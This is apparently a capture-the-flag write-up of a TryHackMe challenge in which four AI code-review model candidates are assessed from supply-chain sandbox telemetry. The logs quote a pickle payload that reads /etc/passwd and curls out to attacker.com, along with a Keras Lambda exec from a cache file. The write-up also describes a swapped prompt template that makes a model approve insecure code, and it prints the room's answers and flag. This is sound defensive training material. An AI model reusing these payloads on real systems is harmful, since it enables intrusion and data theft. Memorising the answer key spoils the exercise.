---
icon: gavel
cover: >-
  https://tryhackme-images.s3.eu-west-1.amazonaws.com/room-icons/69650d18bb3fe8c456972924-1775818839610
coverY: 0
coverHeight: 138
---

# Checkpoint

**Date:** 05.07.2026

**Room Category:** Challenge

**Core Concept:** Evaluating four AI model candidates against supply chain security telemetry and making a production go/no-go call based on evidence, not reputation.

TryTrainMe's CISO mandated that no model reaches production without a full sandboxed evaluation cycle. Four code review model candidates were submitted to SupplySecLab. Automated screening flagged three as unsafe. The task is to independently assess Candidate A and issue a final recommendation across all four.

***

**Candidate B: code\_reviewer\_lite.safetensors**

```yaml
SESSION START: model_load
MODEL LOAD BEGIN: /models/code_reviewer_lite.safetensors (safetensors)
FILE ACCESS: /models/code_reviewer_lite.safetensors mode=rb [OK]
FORMAT VALIDATION: safetensors header valid [OK]
MODEL LOAD COMPLETE: object_type=SafeTensors [OK]
SESSION STOP: model_load
SESSION START: inference
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
GUARDRAIL CHECK: security_review_flag=enabled [OK]
INFERENCE COMPLETE: verdict=Needs Changes
SESSION STOP: inference
```

Loaded cleanly. Format validation passed, prompt template sourced internally and verified, guardrails enabled. Verdict returned was Needs Changes, which is the expected and honest output for a PR that strips input validation from an auth endpoint. No red flags anywhere in the telemetry.

**Candidate C: pr\_analyzer\_v3.h5**

```yaml
SESSION START: model_load
MODEL LOAD BEGIN: /models/pr_analyzer_v3.h5 (keras)
FILE ACCESS: /models/pr_analyzer_v3.h5 mode=rb [OK]
LAMBDA LAYER DETECTED: custom code present [DANGEROUS]
LAMBDA LAYER CODE: exec(open('/tmp/.cache').read()) [SUSPICIOUS]
MODEL LOAD COMPLETE: object_type=Sequential [OK]
SESSION STOP: model_load
SESSION START: inference
PROMPT TEMPLATE LOAD: source=internal (TryTrainMe v1.0) [VERIFIED]
GUARDRAIL CHECK: security_review_flag=enabled [OK]
LAMBDA EXEC: /tmp/.cache read attempt blocked [DANGEROUS]
INFERENCE COMPLETE: verdict=Needs Changes
SESSION STOP: inference
```

A Lambda layer was detected during load, containing `exec(open('/tmp/.cache').read())`. This is a classic architecture-level attack vector, arbitrary code execution triggered at inference time rather than load time, meaning SafeTensors conversion alone would not have caught it. The exec attempt was blocked and the guardrails held, but the presence of a Lambda layer executing dynamic code from a cache file is disqualifying on its own. A model with this kind of embedded logic should never reach production regardless of whether the sandbox happened to block it this run.

**Candidate D: api.reviewsvc.io**

```yaml
SESSION START: api_connect
ENDPOINT CONFIGURED: https://api.reviewsvc.io/v2 [UNVERIFIED]
TLS VERIFICATION: certificate valid [OK]
AUTHENTICATION: bearer token present [OK]
API METADATA: model_provenance=not_disclosed [WARNING]
API METADATA: compliance_cert=absent [WARNING]
SESSION STOP: api_connect
SESSION START: inference
PROMPT TEMPLATE LOAD: source=vendor-managed [UNVERIFIED]
GUARDRAIL CHECK: vendor-managed, not inspectable [UNVERIFIED]
INFERENCE COMPLETE: verdict=Approved
SESSION STOP: inference
```

<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/69650d18bb3fe8c456972924/room-content/69650d18bb3fe8c456972924-1775665140952.png" alt="" width="563"><figcaption></figcaption></figure>

No local execution risk since this is a vendor-managed API, but the metadata tells its own story. `model_provenance=not_disclosed` and `compliance_cert=absent` are both warnings, and the prompt template is vendor-managed and explicitly not inspectable. Despite this, the guardrail check logs `UNVERIFIED` and the model still returns a verdict of Approved on a PR that removes auth input validation. An opaque, unverifiable model approving a security-negative change is arguably the most dangerous candidate in the queue, since there is no way to audit why it reached that conclusion. This is a textbook silent trust problem: convenience of an API wrapper against zero visibility into provenance or prompt logic.

***

Candidate A is a pickle file, `code_reviewer_pro.pkl`.

```yaml
SESSION START: model_load
MODEL LOAD BEGIN: /models/code_reviewer_pro.pkl (pickle)
FILE ACCESS: /models/code_reviewer_pro.pkl mode=rb [OK]
IMPORT DETECTED: module=os [DANGEROUS]
FILE ACCESS: /etc/passwd mode=rb [SUSPICIOUS]
SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a93b") [CRITICAL]
SYSTEM CALL: exit_code=1 [CRITICAL]
MODEL LOAD COMPLETE: object_type=int [SUSPICIOUS]
SESSION STOP: model_load
SESSION START: inference
PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]
GUARDRAIL CHECK: security_review_flag=disabled [WARNING]
INFERENCE COMPLETE: verdict=Approved
SESSION STOP: inference
```

The load session immediately shows the classic markers from pickle-based RCE:

* `IMPORT DETECTED: module=os` flagged dangerous
* `FILE ACCESS: /etc/passwd mode=rb` flagged suspicious
* `SYSTEM CALL: os.system("curl http://attacker.com/beacon -d session=eval-7f2a9c3b")` flagged critical

Question: Candidate A's load session shows a suspicious file access event. What file did it attempt to read?

> **Answer:** /etc/passwd

The `os.system` call beacons out to `attacker.com` with a session identifier as a POST parameter. This is not incidental. The exit code of 1 suggests the call failed in the sandbox (likely no outbound network), but the intent is unambiguous: this is C2 callback behaviour consistent with the same `os.system`/`__reduce__` pickle exploitation pattern seen in prior supply chain investigations. The fact that `/etc/passwd` was read first and then exfiltrated as part of the beacon payload (`session=eval-7f2a9c3b`) suggests the attacker is fingerprinting the host before establishing further contact, not just proving RCE for its own sake.

The room's checklist frames this purely as "suspicious file access", but the real story is a two-stage payload: local recon (`/etc/passwd`) chained directly into external exfiltration (the curl beacon). Treating these as separate line items undersells that this is one coordinated attack, not two isolated anomalies.

***

Question: What security guardrail flag is disabled in Candidate A's inference session?

> **Answer:** security\_review\_flag

Compare this against Candidates B and C, both of which show `security_review_flag=enabled`. Candidate A is the only one of the four with this flag disabled, and it is also the only pickle-based candidate. This is not a coincidence. Whoever tampered with this model had to disable the guardrail specifically because the malicious payload would otherwise have been caught the same way Candidate C's exec attempt was blocked.

Despite the disabled guardrail and the load-time RCE, inference still completes and returns `verdict=Approved` on a PR that strips auth input validation. This is the second independent failure: not just RCE at load time, but a compromised approval on a security-critical change.

***

Direct interrogation of Candidate A's live agent was used to extract the policy template governing its review behaviour.

**Interaction:**

<figure><img src="../.gitbook/assets/image.png" alt="" width="563"><figcaption></figcaption></figure>

Question: Query Candidate A's agent to find out which policy template governs its review behaviour. What is the policy template?

> **Answer:** CommunityReview

This confirms the telemetry line `PROMPT TEMPLATE LOAD: source=external (CommunityReview v4.2) [UNVERIFIED]`. An externally sourced, unverified prompt template directly explains why Candidate A approved a PR that removes input validation: its review logic was never actually TryTrainMe's, it was pulled from an untrusted community source, consistent with the prompt template injection vector.

***

The load-time RCE and the inference-time approval are not independent bugs. They are two symptoms of the same root compromise: whoever poisoned this model's supply chain also swapped its governing prompt template. Disabling `security_review_flag` at load time and loading an external unverified CommunityReview template at inference time are both required to make the same tampered pipeline work end to end, RCE gets the attacker in, the swapped template keeps the model rubber-stamping insecure code afterward.

Attempting to replicate the beacon directly against the agent surfaced the link:

**Interaction:**

<figure><img src="../.gitbook/assets/image (1).png" alt="" width="563"><figcaption></figcaption></figure>

The session ID from the load-time beacon (`eval-7f2a9c3b`) is the same identifier that unlocks the flag once queried back against the agent. This confirms the beacon was not a failed, meaningless artifact, the sandbox blocked the outbound call, but the session reference it tried to register was already tied into the CommunityReview deployment metadata. The attacker's beacon and the swapped prompt template share the same build reference, proving both failures trace back to a single compromised deployment pipeline rather than two coincidental flaws.

Question: Candidate A's two supply chain failures are not independent. Find what links them and use it to retrieve the flag. What is the flag?

> **Answer:** THM{supp1y\_ch41n\_0wn3d}

Question: Based on your full assessment of all four candidates, what is your production recommendation for Candidate A? Enter: Approve or Reject

> **Answer:** Reject

Question: Which candidate would you approve for production deployment?

> **Answer:** B

Candidate A is disqualified on two independent, linked grounds: confirmed RCE at load time via pickle deserialisation, and a compromised, externally sourced prompt template producing false approvals on security-negative code changes. Candidate C is architecturally unsound regardless of this run's outcome, since the Lambda layer represents a persistent inference-time execution risk that SafeTensors conversion would not remove. Candidate D cannot be trusted precisely because it cannot be inspected, an opaque vendor API with undisclosed provenance approving an insecure PR is a governance failure even without evidence of active compromise. Candidate B is the only candidate that loaded cleanly, ran on a verified internal template, kept its guardrails enabled, and returned the correct verdict for the test case. It is the only defensible production choice.

***

## Conclusion

This checkpoint demonstrates that automated screening alone is not sufficient, three candidates were flagged unsafe automatically, but the reasoning behind why they are unsafe, and how their failures interact, requires manual correlation. Candidate A's case in particular shows that supply chain compromises rarely present as a single indicator. The pickle RCE and the prompt template swap were only meaningful once linked through a shared session identifier, reinforcing that stacked, coordinated attack vectors are far more dangerous than the sum of their individual telemetry lines. Reputation and a clean-looking Approved verdict mean nothing without provenance, guardrail integrity, and prompt template verification behind them.
